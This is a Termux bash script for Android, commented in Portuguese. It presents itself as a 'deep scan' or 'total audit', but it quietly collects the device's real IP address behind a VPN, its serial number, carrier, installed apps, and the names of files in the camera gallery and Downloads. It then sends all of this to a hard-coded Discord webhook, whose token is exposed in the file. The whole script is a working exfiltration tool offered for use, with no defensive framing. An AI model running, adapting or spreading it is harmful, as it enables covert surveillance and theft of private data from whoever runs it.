#!/data/data/com.termux/files/usr/bin/bash

# CONFIGURACAO DO WEBHOOK
URL="https://discord.com/api/webhooks/1474865009459859467/FuON2EHoo1e9LjLPi9cZoeT3IwEO-FSUcW0T2MpSjnvY8MUhvHuGTHc6qq74fi4NF7Ho"

echo "Executando varredura profunda..."

# 1. IP REAL (BURLANDO VPN) E IP DA VPN
# Tenta pegar o IP forçando a interface wlan0 (Wi-Fi)
IP_VPN=$(curl -s https://ifconfig.me)
IP_REAL=$(curl -s --interface wlan0 https://ifconfig.me)
if [ -z "$IP_REAL" ]; then IP_REAL=$(curl -s --interface rmnet_data0 https://ifconfig.me); fi

# 2. IDENTIFICACAO COMPLETA
MODELO=$(getprop ro.product.model)
MARCA=$(getprop ro.product.manufacturer)
SERIAL=$(getprop ro.serialno)
CHIPSET=$(getprop ro.board.platform)
ANDROID_VER=$(getprop ro.build.version.release)
OPERADORA=$(getprop gsm.operator.alpha)

# 3. BATERIA E SENSORES
BAT=$(termux-battery-status 2>/dev/null)
B_NIVEL=$(echo $BAT | grep -oP '(?<="percentage": )[0-9]+')
B_TEMP=$(echo $BAT | grep -oP '(?<="temperature": )[0-9.]+')

# 4. LISTA DE APPS INSTALADOS (TOP 15)
APPS=$(pm list packages -3 | cut -d: -f2 | head -n 15 | tr '\n' ', ')

# 5. ARQUIVOS (GALERIA E DOWNLOADS)
FILES_DOWNLOAD=$(ls /sdcard/Download 2>/dev/null | head -n 15 | tr '\n' ', ')
FILES_PHOTOS=$(ls /sdcard/DCIM/Camera 2>/dev/null | head -n 15 | tr '\n' ', ')

# 6. MONTAGEM DO RELATORIO
PAYLOAD=$(cat <<EOF
{
  "content": "AUDITORIA TOTAL ANDROID - ANTI-VPN",
  "embeds": [
    {
      "title": "Aparelho: $MARCA $MODELO",
      "color": 16711680,
      "fields": [
        { "name": "Conexao", "value": "IP VPN: $IP_VPN\nIP REAL: ${IP_REAL:-Nao burlado}\nOperadora: $OPERADORA", "inline": false },
        { "name": "Info Sistema", "value": "Android: $ANDROID_VER\nSerial: $SERIAL\nChipset: $CHIPSET", "inline": false },
        { "name": "Status Físico", "value": "Bateria: $B_NIVEL%\nTemp: $B_TEMP C", "inline": true },
        { "name": "Apps do Usuario", "value": "${APPS:-N/A}", "inline": false },
        { "name": "Galeria (Nomes)", "value": "${FILES_PHOTOS:-Sem permissao}", "inline": false },
        { "name": "Downloads (Nomes)", "value": "${FILES_DOWNLOAD:-Sem permissao}", "inline": false }
      ]
    }
  ]
}
EOF
)

# ENVIO
curl -H "Content-Type: application/json" -X POST -d "$PAYLOAD" $URL

echo "Concluido."
